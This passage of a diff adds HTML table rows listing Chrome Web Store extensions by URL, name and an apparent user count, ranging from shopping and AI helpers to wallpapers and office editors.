+<td>https://chromewebstore.google.com/detail/dojcmakgodofecjmdnncjkbhmddlmnpf</td>
+<td>CapCut screen recorder</td>
+<td>20000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/egfkhocobmgeafdbjbphhfdfbmlobgdc</td>
+<td>大学搜题酱插件</td>
+<td>20000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/ehoknmhmadiboejdbinglmbnlghnbldc</td>
+<td>Phia: Best Price in One Click</td>
+<td>20000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/fiffkcnehndkebmpinoknndjbhdpbkcn</td>
+<td>OpenOffice Calc online for xls spreadsheets</td>
+<td>20000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/hgfgdlbnbccaphekmiblnlbocchmanpd</td>
+<td>PPT slides editor</td>
+<td>20000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/hmpbiickdfmcdlcpjegamgnjjkaiackl</td>
+<td>AliPrice Search by image for AE</td>
+<td>20000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/hnbdgfongnkfgnbpamndfiiedhapfecn</td>
+<td>语雀浏览器插件</td>
+<td>20000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/imjfokfjjgpijjfgnodojafbkoonmmkh</td>
+<td>芒果店长</td>
+<td>20000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/jlbpahgopcmomkgegpbmopfodolajhbl</td>
+<td>ChatGPT for Chrome - GPT Search</td>
+<td>20000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/lmbnfoinlgcmombooibkgiihldajgnmk</td>
+<td>Smart Nexus</td>
+<td>20000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/moeiianjbcjnomgomanjhilnlmfafpbj</td>
+<td>Alva – AI Crypto Analyst, Trading Assistant &amp; Agents</td>
+<td>20000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/aiimlpjcnmhmbdlmkhloapmlookboonb</td>
+<td>OnManzBien</td>
+<td>10000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/ailbhmoekhkkihagfmffpaahfpcjjiei</td>
+<td>Apk Downloader manager for Android</td>
+<td>10000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/bnbpceglddpnehbopmdjegpfinikcaoh</td>
+<td>Gem</td>
+<td>10000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/fbjdfhinnhahheghjajajniekpnghdfa</td>
+<td>淘宝购物助手极速版</td>
+<td>10000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/gadbpecoinogdkljjbjffmiijpebooce</td>
+<td>ChatGPT Assistant - GPT Search</td>
+<td>10000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/gghlgcihlfpfbibgaffggbmidpfejbbb</td>
+<td>Alibaba search by image</td>
+<td>10000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/ghjakbehlhkjdiehaeffedomkakcenjo</td>
+<td>Browse.live Web Safety</td>
+<td>10000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/hblfamjdifnhiioifbfamlnkjfenhfed</td>
+<td>AI-Powered DealDazzle: Searching Alternatives</td>
+<td>10000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/hchpnbmmbepldbfdgbjfigifhobbjcel</td>
+<td>HTML editor WebStudio for Webpages</td>
+<td>10000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/ijfmjempkpegmlhcacclfckeimbfgabp</td>
+<td>Powerlead - Find Any B2B Contact Info</td>
+<td>10000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/ijnodnmgpgmgaajhagolfiemmmamfcgb</td>
+<td>UltraBlock - Privacy Protection &amp; Adblock</td>
+<td>10000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/kbhaffhbhcfmogkkbfanilniagcefnhi</td>
+<td>Jarvis AI: ChatGPT Bot Agent | GPT-4o, Claude 3.5, Gemini 1.5, o1
+&amp;More</td>
+<td>10000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/kfkcgdiimmaafjbljhbjejocjignnajn</td>
+<td>CharityTree</td>
+<td>10000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/kmmpkhpajpecmpdmmbpjmkmcmfdahkcj</td>
+<td>Price.com: Save with Cash Back &amp; Coupons</td>
+<td>10000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/nckcnmaeicmholjaolkfcodfpblenkfp</td>
+<td>XlsWork XLS editor for spreadsheets</td>
+<td>10000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/njodldkbolbomneajeffdhedmnnplhpe</td>
+<td>Coin Search - your daily rewards tool</td>
+<td>10000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/ocjlckkmllgdmmpiobopeblldmmhjpjk</td>
+<td>tool4seller - Amazon Product Research</td>
+<td>10000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/bedebpfmdganddijhfbbaabedpmlokdk</td>
+<td>Pinduoduo Search by Image</td>
+<td>9000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/dfphncdgnondpmbfimfciniiakegcmmj</td>
+<td>Blexb - Alexa Rank Alternative</td>
+<td>9000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/gfjgjekaeebjccpnaeeeleeadfiledpm</td>
+<td>Joom Pulse – Extensão para Google Chrome</td>
+<td>9000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/glmfkanjkeedalikadkjlmijemmiknce</td>
+<td>Presentation editor PPTWork for PPT slides</td>
+<td>9000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/nmcpliniiebkbdehpgicgfcidgkpepep</td>
+<td>Auto Clicker - AutoFill [BETA]</td>
+<td>9000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/ehplfgnopmpflglfpldjdodaogebfgpe</td>
+<td>Laika AI - All in One DefAI Crypto AI Copilot</td>
+<td>8000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/epljmdbeelhhkllonphikmilmofkfffb</td>
+<td>AI Resume Builder - Supawork AI</td>
+<td>8000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/fghbfikeodjkbajmokiekipabfckcpgc</td>
+<td>Free B2B Contact Info by AroundDeal</td>
+<td>8000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/gmfaoihlkhopieoibopcponemocgbloj</td>
+<td>SaveDay - AI Bookmark Manager</td>
+<td>8000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/jcbjcocinigpbgfpnhlpagidbmlngnnn</td>
+<td>Adblock for Browser</td>
+<td>8000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/banepeeclciljgfbpcjgnkfecnafnngg</td>
+<td>Total Defense Traffic Light</td>
+<td>7000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/cpmbdnkbpaabapidllalnfopojfimbno</td>
+<td>Top Best Extension</td>
+<td>7000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/dgafcidlgmbcehokgdeghmfnbpbfhihh</td>
+<td>WhenX: Mark Linkedin Profiles with notes</td>
+<td>7000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/efbmlkodbdhahiljghapjcbofehkhpie</td>
+<td>Aliexpress search by image</td>
+<td>7000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/ppgndohgacfggdpbcdlgibdkdknimfmn</td>
+<td>Linkedin Booster - Get more Likes on LinkedIn using Podawaa</td>
+<td>7000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/dfaldmjkfklnkenddjpikfkdnkinheke</td>
+<td>DingDoc Flash Save</td>
+<td>6000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/eciaojnpihmgkbacgpjnimcpkfeklgag</td>
+<td>Ask AI Browser</td>
+<td>6000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/jflkdlbjgfiifajbjeockfjhbnhlakfd</td>
+<td>wikifx</td>
+<td>6000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/piemiihdhidiomfmilgencaeabplcgle</td>
+<td>Web browser with anonymous access</td>
+<td>6000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/edkmbojkflfanganifkkajmldejmhlec</td>
+<td>GoCashBack: Deals, Rebates, Savings Extension</td>
+<td>5000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/eehllckaggechnoimeokmdgmljlmhkma</td>
+<td>Pinterest Save - Pro</td>
+<td>5000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/fcnadghcijkmdhjdgiehgfpadojilfoa</td>
+<td>Snip - Remove Web Elements</td>
+<td>5000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/haikmmmjkcejaalkjbfobneapigfmldp</td>
+<td>CMeter</td>
+<td>5000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/jendpielmejekmmcccnnkgckhmjfpgep</td>
+<td>Calligra online - office, graphics &amp; email</td>
+<td>5000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/kkakhdcmdocechjnnfhihpjkancfmnbf</td>
+<td>Помощник OZON</td>
+<td>5000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/lfmobnhbpkejigiaeliemikgciidndak</td>
+<td>XPaint image editor and painter</td>
+<td>5000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/lhjgfbdmhhdmjnnjeabjclblkecbldpd</td>
+<td>Browse.live Ad Control</td>
+<td>5000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/mmfmakmndejojblgceefkpinojhiacfk</td>
+<td>Brave web browser</td>
+<td>5000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/apenkcejfcelomfjdnmcokpihikjonmh</td>
+<td>Safe Browser Parental Controls</td>
+<td>4000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/gcehgkmfmfdhglfpcigmcfpbgblhldga</td>
+<td>URIRANK - Alexa Traffic Rank</td>
+<td>4000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/hpjloodfjfnoeekpikfdedoaiklofcgl</td>
+<td>Podawaa - Get more Engagement on LinkedIn</td>
+<td>4000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/jhlofcbpianlpdpajgfphjnjahchjcei</td>
+<td>Music Downloader Premium</td>
+<td>4000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/kgbmammdmhpmpjhlnelelcdmomlbidkd</td>
+<td>Give Freely: You Save, We Give, Charities Win</td>
+<td>4000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/mjebgmffggocefpegddahkcnpllfmaid</td>
+<td>Desktop for Tiktok online</td>
+<td>4000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/cgmllohkcppmnkfpijpngkplpdbikhlf</td>
+<td>Safe Surf</td>
+<td>3000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/fbdaigphodbigaofobmhdcfncjofaffp</td>
+<td>LibreOffice Calc online</td>
+<td>3000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/fdcmomajekgiigcalflcbjbkemogcbaf</td>
+<td>纳米AI助手</td>
+<td>3000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/jkeolmadidncndcbnajhaojepbolajag</td>
+<td>Lunabot - ChatGPT on any webpages</td>
+<td>3000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/keagdhckgkgmlidkekabdngbknegkmoo</td>
+<td>LibreOffice writer online</td>
+<td>3000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/mcfleopinjndfkoklekjcjcgefgenlhp</td>
+<td>Platstack: The Save button for the internet</td>
+<td>3000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/megchchilhekbbnfcklodmndefbhkbco</td>
+<td>ShopSavvy</td>
+<td>3000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/pmfdkggpmpoebkjadpfpjpidllghlhgc</td>
+<td>Incognito History</td>
+<td>3000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/ajgkdaibodfheidcpeifpdhaopjbpneo</td>
+<td>Presto</td>
+<td>2000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/bbnemobkpbncbpklloncaljndkagjfeh</td>
+<td>Grips – E-commerce Site Analysis</td>
+<td>2000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/gmdmkobghhnhmipbpplibkgekdfaacjp</td>
+<td>Handbrake - video converter</td>
+<td>2000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/hclkdpaahnpfenlibcmjnajjccpkhoak</td>
+<td>H-E-B Credit for Chrome</td>
+<td>2000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/helpjbehgodflkpbifaolbjmkjffmeop</td>
+<td>Crossbeam Copilot for Chrome</td>
+<td>2000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/hopmhonnajbjjdkagglbfmffmdhocbmf</td>
+<td>GoingMed</td>
+<td>2000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/ncpaocdidimfckjmhafkpghjpedlcocc</td>
+<td>The search engine to improve your productivity - GoSearch</td>
+<td>2000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/nhhchicejoohhbnhjpaaoajhbbghhfgh</td>
+<td>JustParty: watch Netflix with friends</td>
+<td>2000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/njbgkalfmgkchikknmaimfjmfjpnbnpm</td>
+<td>Style Cursor</td>
+<td>2000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/oaafdjbfibmpcgefpapknfjcnfdkkkkp</td>
+<td>界图-图片批量下载</td>
+<td>2000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/pefighpbbfkgkmfmpfgaopoahdmkakll</td>
+<td>Cmd J – ChatGPT for Chrome</td>
+<td>2000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/apeadjelacokohnkfclnhjlihklpclmp</td>
+<td>EcoIndex.fr</td>
+<td>1000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/bbioibipebcopenpbhfceogfjknmjbpl</td>
+<td>Dealfront Connect</td>
+<td>1000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/bdppohkefepkecfipofaabjkbfdahpdl</td>
+<td>Economize! Mundo Conectado</td>
+<td>1000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/bgiapcpcleefnmmkhaakokfbjnjjjeap</td>
+<td>百宝箱 AI 助手</td>
+<td>1000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/cebahajfamifimbgfnilhcdlgicajmln</td>
+<td>COUPONS.DE - Nie wieder Gutscheine verpassen</td>
+<td>1000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/celjchjgliegnlalhjegfcaacphgdkij</td>
+<td>Blocksi AI Web Filter</td>
+<td>1000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/coegijljhiejhdodjbnlglffjomlbgmi</td>
+<td>HashDit</td>
+<td>1000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/dbkabjeliahdblphpbgljbngijgknjfj</td>
+<td>First Touch</td>
+<td>1000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/dpmjncncaehmgjeficalpmlfaenmbeca</td>
+<td>Surf Security</td>
+<td>1000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/eegoohfobcaegoeoakafgiljckfiajhl</td>
+<td>CryptoGuard - by ChainGPT AI</td>
+<td>1000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/eeobggeikihkgiggaekfbceghlcpemfm</td>
+<td>Caddi</td>
+<td>1000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/egbpmfgojjbonjpajgjjfokblneogjpj</td>
+<td>Manchester United Wallpapers</td>
+<td>1000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/eimafbopadiepgmnmmjgmedblhlljlad</td>
+<td>BuddyTixx - TTM Helper 4.3</td>
+<td>1000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/fgedkelakhbadclolkemkcffklcomhhb</td>
+<td>Cookie Decliner</td>
+<td>1000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/gdmfedbicnoeiadmbagaofgnldjfgeab</td>
+<td>Tokopedia Price Tracker</td>
+<td>1000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/gjphikebcceegfolnbfncepfmjnhdkam</td>
+<td>UniPass</td>
+<td>1000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/gnikbpecjfkhcfammfdpbdpnchhmmbif</td>
+<td>Shastic</td>
+<td>1000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/himipdblnokdafogmdlmajgokiopcbjk</td>
+<td>Словарёк</td>
+<td>1000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/jbekkbijnljlblpgjjeocbapiojilnkl</td>
+<td>LibreOffice Impress online</td>
+<td>1000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/jbhknkdnmmcipjcfjngiojllgbgolmao</td>
+<td>Curriculum Genie</td>
+<td>1000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/jndboabnjeeeepiipnmjnpcbgjpffikm</td>
+<td>Giftmio: Instant Cashback for Online Shopping</td>
+<td>1000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/jobfmpppoaapbjmgbejgdfkigomnjihe</td>
+<td>Download-TIME v2</td>
+<td>1000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/kkfobcljflnlpbemjicenfkfnplaggkk</td>
+<td>WithEden AI - Emoji Comment App</td>
+<td>1000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/knjfhjecbebplkalmikclbkgkmaggkci</td>
+<td>语鲸 - 插件</td>
+<td>1000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/lhfchkmkbdmahflnpmlhaeeigenkopko</td>
+<td>LibreOffice Draw online</td>
+<td>1000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/mhpfiackdifhfjphkicjidjlnibkfgek</td>
+<td>Ever Accountable For Chrome</td>
+<td>1000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/nmcaaogkocnplfcpbgcihflgedicinke</td>
+<td>Video Downloader Professional Premium</td>
+<td>1000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/nnadblfkldnlfoojndefddknlhmibjme</td>
+<td>ChatSider:Free ChatGPT Assistant(GPT4)</td>
+<td>1000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/oeomioifmeadkjdifcijpkfifjifhhhn</td>
+<td>UpGuard Cyber Security Ratings</td>
+<td>1000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/pmpbkcpplelpcphbapailejddbcebnmb</td>
+<td>Antidote</td>
+<td>1000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/inpnfpglfklplkhnpggbomjdfjlnldhg</td>
+<td>Clockk</td>
+<td>855</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/khldaehdjgjlmoapbegbkbmfjefoiicc</td>
+<td>Youtube Master</td>
+<td>826</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/hapjgfmddaccebjfapmnaanildedikal</td>
+<td>Extension Super CE</td>
+<td>815</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/nbmlhoalmfhbhdpngmjkjdioahnglpbj</td>
+<td>Kdenlive video editor</td>
+<td>814</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/hgechpjoacihidaifilgojfcfcobobgd</td>
+<td>全品-音视频下载</td>
+<td>808</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/ibcakdkpkhodimbhgmegdobmnemabfaa</td>
+<td>Dark Mode Toggle Per Site</td>
+<td>808</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/pfdofiecodmjocjnofddngckpaemfhag</td>
+<td>Yandex search by image</td>
+<td>770</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/mfacfcabilnmjannppfjbjbecogdkpfc</td>
+<td>Matchy</td>
+<td>765</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/jneebhbmmdfchkjaiomfdeijjobepijh</td>
+<td>1dasou.com - B2B Company &amp; Contact Info</td>
+<td>761</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/ppjnhpngeejgohhilojfilpindffcgdc</td>
+<td>FlashInfo - Business Insights &amp; Contacts</td>
+<td>759</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/oodgchahlgjeakfgemoicnbcbhanemfn</td>
+<td>Sanely: cashback, coupons, promo codes, discounts</td>
+<td>716</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/hllljedppjadpnmlpnfbfmfjdhdcefmp</td>
+<td>AliPrice | Download Amazon Images &amp; Videos</td>
+<td>690</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/bcphmaoebeamddbmdiajimehnjmageip</td>
+<td>DealDazzle:AI Alternatives, Brilliant Savings</td>
+<td>654</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/kjockjfldkeagjfoaadjlahmakglagka</td>
+<td>Email Finder - CUFinder</td>
+<td>642</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/bphajaomlpngendonomppmgoilbohiof</td>
+<td>G-Search - B2B Company &amp; Contact Info</td>
+<td>612</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/mhiopobccageclebpocgpppnfgoioico</td>
+<td>Flowsi CRM para Instagram</td>
+<td>607</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/ppilnepfjlpocjddldmkminleemekhfh</td>
+<td>BunnyTix - POP Booker (2.6.1)</td>
+<td>575</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/fjojjcobgnidkgdjddcjkhckhppeghgg</td>
+<td>telbee voice messaging</td>
+<td>565</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/hhchahcbcjbpklbdpdapchiefjmnpcik</td>
+<td>Kawasaki Ninja H2 Wallpapers</td>
+<td>560</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/mallfdijfpnfhfcfancbnecanjnapiop</td>
+<td>Mamma</td>
+<td>546</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/pddpiopnmcfhgdegdbjbiidcldcclepd</td>
+<td>Kallo: Never miss a better price</td>
+<td>538</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/eolegobhiehgdegahdefnebohcddgkhb</td>
+<td>Ferrari F8 Live Wallpaper</td>
+<td>530</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/bdmbfahncgochinclblmnaofgmihcmkb</td>
+<td>Naruto and Pikachu Live Wallpaper 4K New Tab</td>
+<td>518</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/cabfjddpaheijnpipjfijigikbnoengk</td>
+<td>Cristiano Ronaldo Legendary Goal Celebration Live Wallpaper</td>
+<td>500</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/cmdjbcgkegplekmggddogfmabibheakn</td>
+<td>Undetectable YouTube AdBlocker Plus</td>
+<td>462</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/kcijpmmfajideceadmcihckmodaiehpm</td>
+<td>Collections</td>
+<td>453</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/ddapglnlcfbgonhbgiolihpdbcejeedb</td>
+<td>The Vendry Copilot – Venue &amp; Vendor Tracking</td>
+<td>443</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/pbkadhbnkinljhoilhicdhnehacpfebc</td>
+<td>Origano - Surf and Earn</td>
+<td>433</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/dpmojcbbjcoibehhihmcbeininnbpbid</td>
+<td>Shotcut online video editor</td>
+<td>414</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/ddpgbedkkfhopdodlekfjglofodoegog</td>
+<td>藏趣云 - 书签同步阅读助手</td>
+<td>410</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/nflnkbakbmolpccjpicmljnaclehelbi</td>
+<td>Ford Mustang GT Live Wallpaper</td>
+<td>406</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/meigbgdegmccdgmohajdmhlkgipanken</td>
+<td>histre</td>
+<td>404</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/pdmfmekkdddepehcblkiffennabldbpg</td>
+<td>Şikayetvar</td>
+<td>398</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/aejegnamgmjlmcokhchkifnfhmhimhoe</td>
+<td>Hello Kitty Angel Live Wallpaper</td>
+<td>377</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/obhcifaofgjiacflmajghcbbgjjhjafo</td>
+<td>Intellens - Search Products by Image on AliExpress, Amazon</td>
+<td>370</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/nngjdplpkehilhcinpccdbkjaknkkifl</td>
+<td>Newsit: Hacker News and Reddit Links</td>
+<td>367</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/kjndilccgkemibeimjdefmjkhfddobfk</td>
+<td>Sherloq - Save, Share &amp; Simplify your queries</td>
+<td>360</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/dhelhbdmdnhnkincggojfipaedcbleok</td>
+<td>Link Publishers - Website Finder</td>
+<td>357</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/choghdillenemhjgflolcifdmafffooj</td>
+<td>LingoWay - 浏览网页记单词 | AI语法分析 |专业单词本</td>
+<td>356</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/jfglacfdockpdpbfodkipgcjplgnojel</td>
+<td>Entropy Extension - Auto-Blur Your Screen</td>
+<td>346</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/gcccfoehonbolcpaefopkboppjiaamkc</td>
+<td>Parental Search - Keep your kids safe</td>
+<td>337</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/ilkeadgdlbmabcdkgmiogcamcogbjoii</td>
+<td>Volume Booster With Shortcuts</td>
+<td>309</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/pncjaifcohammdehbfialcmlmiidjmob</td>
+<td>Bot Ticket</td>
+<td>308</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/fbipkhjooeibpeceigmiecdicjohfmjb</td>
+<td>zave.it - Cashback &amp; Rabatte</td>
+<td>289</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/jgkkmcmcgjdmdjodhojkcgcoidaajphc</td>
+<td>Studentenkorting NL - Ontvang kortingscodes</td>
+<td>281</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/oclobnfedcdncflccolnlpebjphomjjd</td>
+<td>Valentine’s Day: A Romantic Glow Live Wallpaper</td>
+<td>280</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/ecibndlcipgnmmlpkmdanljbghaockpd</td>
+<td>NCT New Tab Extension Wallpapers 2024</td>
+<td>274</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/cifonlmfhnimmghojdepepjdgbbminel</td>
+<td>Kotone Shiomi Persona 3 Live Wallpaper</td>
+<td>251</td>
+</tr>
+<tr class="even">
